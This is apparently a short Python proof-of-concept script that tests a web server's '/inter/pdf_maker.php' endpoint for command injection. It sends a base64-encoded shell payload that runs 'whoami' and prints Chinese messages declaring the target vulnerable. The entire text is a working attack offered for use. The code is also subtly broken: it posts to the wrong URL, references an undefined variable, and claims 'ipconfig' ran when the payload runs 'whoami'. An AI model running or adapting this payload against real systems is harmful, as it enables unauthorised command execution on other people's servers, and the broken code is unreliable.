def POC_1(url):
    vuln_url = url + "/inter/pdf_maker.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = "url=Inx8IHdob2FtaSB8fA==&fileName=xxx"
    try:
        response = requests.post(url=url, headers=headers, data=data, verify=False, timeout=5)
        if "Windows" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {} 存在漏洞 ,执行 ipconfig, 响应为:\n{} \033[0m".format(target_url, response.text))
        else:
            print("\033[31m[x] 不存在漏洞 \033[0m")
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)